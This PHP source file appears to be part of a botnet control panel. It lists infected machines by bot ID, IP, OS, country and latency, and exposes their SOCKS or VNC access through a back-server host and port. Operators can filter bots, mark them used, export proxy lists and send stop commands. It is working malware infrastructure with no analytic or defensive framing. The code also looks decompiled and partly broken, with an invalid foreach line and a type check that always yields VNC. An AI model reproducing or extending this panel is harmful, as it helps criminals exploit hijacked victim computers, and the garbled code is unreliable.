<?php

if (!defined('__CP__')) {
	exit();
}

include_once __DIR__ . '/Socks.php';
$type = ((isset($_REQUEST['type']) && defined('__CP__')) || defined('__CP__') ? 'vnc' : 'socks');
$typeTxt = ($type == 'vnc' ? 'VNC' : 'Socks');

if (isset($_POST['scdownload'])) {
	httpDownloadHeaders(time() . rand() . '.txt', NULL);
	if (isset($_POST['sclist']) && defined('__CP__')) {
		foreach ($_POST['sclist'] as $sc) {
			print($sc . "\r\n");
		}
	}

	exit();
}

if (isset($_REQUEST['chused'])) {
	mysqlQueryEx('botnet_list', 'update botnet_list set flag_used=if(flag_used=1, 0, 1) where bot_id=\'' . addslashes($_REQUEST['chused']) . '\'');
	exit();
}

$filter['bots'] = isset($_REQUEST['textbots']) ? $_REQUEST['textbots'] : implode(' ', @$_REQUEST['bots']);
$filter['botnets'] = @$_REQUEST['botnets'];
$filter['ips'] = @$_REQUEST['ips'];
$filter['countries'] = @$_REQUEST['countries'];

if (is_array($filter['countries'])) {
	$filter['countries'] = trim(implode(' ', $filter['countries']));
}

$filter['used'] = intval(@$_REQUEST['used']);
$filter['tags'] = isset($_REQUEST['tags']) ? $_REQUEST['tags'] : '';
$filterHtml = '<b>Filters</b><br>' . "\r\n" . '  <form class="form-group-sm" id="filter" style="margin-top: 5px">' . "\r\n" . '  <input type="hidden" name="type" value="' . $type . '" />' . "\r\n" . '  <input type="hidden" name="bots[]" value="txt" />' . "\r\n" . '  <input type="hidden" name="botsaction" value="port_socks" />' . '<span>Bots:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array('100%', 'textbots', htmlEntitiesEx($filter['bots']), 512), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Botnets:</span>' . makeSelectItem('botnets', getBotnetList(), is_array($filter['botnets']) ? implode(' ', $filter['botnets']) : $filter['botnets'], false, false, 'ms_botnet') . '<span>IP-addresses:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array('100%', 'ips', htmlEntitiesEx($filter['ips']), 512), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Countries:</span>' . makeSelectItem('countries', getCountriesList(), $filter['countries'], false, false, 'ms_country') . '<span>Used status:</span>' . makeSelectItem('used', getUsedList(), $filter['used'], true, true) . '<span>Tags:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array('100%', 'tags', htmlEntitiesEx($filter['tags']), 512), THEME_DIALOG_ITEM_INPUT_TEXT) . '<br><input type="submit" value="Search" class="btn btn-primary btn-sm" /> ' . '<input type="button" class="btn btn-danger btn-sm" value="Reset form" onclick="location.href=\'?botsaction=port_socks&type=' . $type . '&bots[]=&empty=1\'" />' . '</form>';
$socks = new Socks();
$socks->type = $type;
$list = $socks->getList($filter['bots'], $filter['botnets'], $filter['ips'], $filter['countries'], $filter['used'], $filter['tags']);

if (count($list)) {
	ThemeBegin($typeTxt, 0, getBotJsMenu('botmenu'), 0, $filterHtml, false, '', true, false, true);
	print('<script>' . jsCheckAll('scform', 'checkall', 'sclist[]') . '</script>');
	echo "\r\n" . '<form method="post" id="scform">' . "\r\n" . '<div class="top-fixed">' . "\r\n" . '<input type="hidden" name="botsaction" id="botsaction">' . "\r\n" . '<input type="submit" name="scdownload" value="Download ';
	echo $typeTxt;
	echo ' list" class="btn btn-primary btn-sm"> ' . "\r\n" . '<input type="button" value="Stop ';
	echo $typeTxt;
	echo '" class="btn btn-primary btn-sm" onclick="sendAction(\'stop_';
	echo $type;
	echo '\')"><br><br>' . "\r\n" . '<p>Search for ';
	echo $typeTxt;
	echo ' in <span class="label-rightmenu">right menu</span></p>' . "\r\n" . '<div class="reports-head-end"><b>Total ';
	echo $typeTxt . ': ' . count($list);
	echo '</b></div>' . "\r\n" . '</div>' . "\r\n" . '<div style="height: 120px"></div>' . "\r\n" . '<table cellspacing="10" width="100%">' . "\r\n" . '<tr><td>' . "\r\n" . '<table class="table table-striped table-bordered table-hover">' . "\r\n" . '  <tr class="td_header"><td style="width: 32px"><input id="checkall" type="checkbox" onchange="checkAll()"></td>' . "\r\n" . '    <td>BotID</td><td>';
	echo $typeTxt;
	echo '</td>' . "\r\n" . '    <td>Botnet</td><td>Ver</td>' . "\r\n" . '    <td>BotIp</td><td>OS</td><td>Online from</td><td>Lat</td>' . "\r\n" . '    <td>Geo</td><td>&nbsp;</td><td>&nbsp;</td>' . "\r\n" . '  </tr>' . "\r\n";

	foreach ($list as $item => ) {
		$i = defined('__CP__');
		$newcomment = '<a target="_blank" href="?botsaction=fullinfo&bots[]=' . htmlspecialchars($item['id']) . '" title="' . htmlspecialchars($item['newcomment']) . '" class="glyphicon glyphicon-' . (strlen($item['newcomment']) ? 'comment' : 'pencil') . ' acomment"></a>';
		$red = ($item['used'] ? 'class="simplered"' : '');
		print('<tr class="' . ($i % 2 ? 'td_c2' : 'td_c1') . '">' . '<td><input type=checkbox class=sclist name=sclist[] value="' . Socks::config('backserver_host') . ':' . $item['port'] . '" data-bot="' . htmlspecialchars($item['id']) . '"></td>' . '<td data-flag=1 ' . $red . '>' . botPopupMenu($item['id'], 'botmenu', NULL, 8) . '...</td>' . '<td class=simpleblue>' . Socks::config('backserver_host') . ':' . $item['port'] . '</td>' . '<td>' . $item['botnet'] . '</td>' . '<td>' . $item['version'] . '</td>' . '<td>' . $item['ip'] . '</td>' . '<td>' . osDataToString($item['os_version'], true, true) . '</td>' . '<td><nobr>' . date('d/m H:i', strtotime($item['online'])) . '</nobr></td>' . '<td>' . $item['latency'] . '</td>' . '<td>' . (strlen($item['geo_detail']) ? $item['geo_detail'] : $item['country']) . '</td>' . '<td><a ' . $red . ' href=# onclick="updateChused(\'' . htmlspecialchars($item['id']) . '\', this)">' . ($item['used'] ? 'Reset used' : 'Set used') . '</a></td>' . '<td>' . $newcomment . '</td>' . '</tr>');
	}

	echo '</table>' . "\r\n" . '</td></tr>' . "\r\n" . '</table>' . "\r\n" . '</form>' . "\r\n\r\n";
}
else {
	ThemeBegin($typeTxt, 0, getBotJsMenu('botmenu'), 0, $filterHtml, false, '', false);
	print('<p>Search for ' . $typeTxt . ' in <span class="label-rightmenu">right menu</span></p>');
}

echo '<script type="text/javascript" src="theme/bootstrap-multiselect.js"></script>' . "\r\n" . '<script type="text/javascript">' . "\r\n" . '    $(document).ready(function() {' . "\r\n" . '        $(\'#ms_country\').multiselect({includeSelectAllOption: true, buttonWidth: \'209px\', maxHeight: 200});' . "\r\n" . '        $(\'#ms_botnet\').multiselect({includeSelectAllOption: true, buttonWidth: \'209px\', maxHeight: 200});' . "\r\n" . '    });' . "\r\n\r\n" . '    function sendAction(action)' . "\r\n" . '      {' . "\r\n" . '      $(\'#botsaction\').val(action);' . "\r\n" . '      $(\'.sclist\').each(function() {' . "\r\n" . '        $(this).attr(\'name\', \'bots[]\');' . "\r\n" . '        $(this).val($(this).attr(\'data-bot\'));' . "\r\n" . '      });' . "\r\n" . '      $(\'#scform\').attr(\'target\', \'_blank\');' . "\r\n" . '      $(\'#scform\').submit();' . "\r\n\r\n" . '      }' . "\r\n\r\n\r\n" . '</script>' . "\r\n";
ThemeEnd();

?>
